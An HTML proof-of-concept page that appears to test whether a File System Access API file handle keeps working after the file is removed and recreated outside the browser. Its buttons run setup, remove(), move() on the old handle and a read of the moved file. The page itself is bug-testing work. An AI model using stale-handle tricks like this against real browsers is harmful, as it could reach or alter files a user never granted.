<!doctype html>
<html>
<head>
  <meta name="viewport" content="width=device-width">
  <title>FSA Revocation PoC</title>
</head>

<body>

<button onclick="setup()">1. SETUP</button>
<button onclick="removeFile()">2. REMOVE FILE</button>
<button onclick="moveFile()">3. MOVE FILE</button>
<button onclick="readMovedFile()">4. READ MOVED FILE</button>

<pre id="log"></pre>

<script>
let dirHandle = null;
let fileHandle = null;

const log = (x) => {
  document.getElementById("log").textContent += x + "\n";
};

async function setup() {
  document.getElementById("log").textContent = "";

  try {
    log("Origin: " + location.origin);

    dirHandle = await showDirectoryPicker({
      mode: "readwrite"
    });

    log("DIRECTORY HANDLE: OK");

    fileHandle = await dirHandle.getFileHandle("FSA_TEST.txt");

    log("FILE HANDLE: OK");
    log("name: " + fileHandle.name);

    log(
      "read permission: " +
      await fileHandle.queryPermission({ mode: "read" })
    );

    log(
      "write permission: " +
      await fileHandle.queryPermission({ mode: "readwrite" })
    );

    const file = await fileHandle.getFile();

    log("INITIAL CONTENT: " + await file.text());

  } catch (e) {
    log("SETUP ERROR: " + e.name);
    log(e.message);
  }
}

async function removeFile() {
  try {
    if (!fileHandle) {
      log("Run SETUP first.");
      return;
    }

    log("");
    log("=== REMOVE ===");

    await fileHandle.remove();

    log("remove(): SUCCESS");

    log(
      "read permission after remove: " +
      await fileHandle.queryPermission({ mode: "read" })
    );

    log(
      "write permission after remove: " +
      await fileHandle.queryPermission({ mode: "readwrite" })
    );

    try {
      await fileHandle.getFile();
      log("OLD HANDLE READ: SUCCESS");
    } catch (e) {
      log("OLD HANDLE READ: " + e.name);
    }

    log("");
    log("NOW RECREATE FSA_TEST.txt EXTERNALLY");
    log("Use Termux before pressing MOVE.");

  } catch (e) {
    log("REMOVE ERROR: " + e.name);
    log(e.message);
  }
}

async function moveFile() {
  try {
    if (!fileHandle || !dirHandle) {
      log("Run SETUP first.");
      return;
    }

    log("");
    log("=== MOVE ===");

    await fileHandle.move(
      dirHandle,
      "FSA_MOVED.txt"
    );

    log("move(): SUCCESS");

  } catch (e) {
    log("move(): " + e.name);
    log(e.message);
  }
}

async function readMovedFile() {
  try {
    log("");
    log("=== READ MOVED FILE ===");

    const newHandle =
      await dirHandle.getFileHandle("FSA_MOVED.txt");

    log("NEW HANDLE: SUCCESS");

    log(
      "new handle read permission: " +
      await newHandle.queryPermission({ mode: "read" })
    );

    const file = await newHandle.getFile();

    const content = await file.text();

    log("READ SUCCESS");
    log("CONTENT: " + content);

  } catch (e) {
    log("READ ERROR: " + e.name);
    log(e.message);
  }
}
</script>

</body>
</html>
